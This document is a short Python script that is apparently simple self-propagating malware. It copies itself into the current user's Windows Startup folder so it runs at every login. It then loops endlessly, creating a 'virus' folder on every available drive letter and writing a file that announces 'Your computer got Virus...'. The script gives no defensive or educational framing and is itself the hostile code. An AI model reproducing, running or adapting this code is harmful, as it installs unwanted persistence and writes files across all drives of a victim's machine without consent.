import socket
import os
computer_name=socket.gethostname()
import shutil
from os import path
import getpass
import sys

USER_NAME = getpass.getuser()
source_path = sys.argv[0]

    
drives = [ chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":") ]
i = 0
while(i>=0):
  i = i+1
  if path.exists(source_path):
    destination_path = "C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup" % USER_NAME
    isExist = path.exists(destination_path)
    if not isExist:
        destination_path = "C:/Users/user/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    
    new_location = shutil.copy(source_path, destination_path)
    #print("% s show path,% s" % (source_path , new_location))
    #print(destination_path)
    
  for drive in drives:
      dir=drive+"/virus"
      try:
          if not os.path.exists(dir):
            os.mkdir(dir)
          file = open(f"{dir}/{computer_name}.da","w")
          file.write("Your computer got Virus...")
          file.close()
      except:
        print('No')
  """if i==10:
    break"""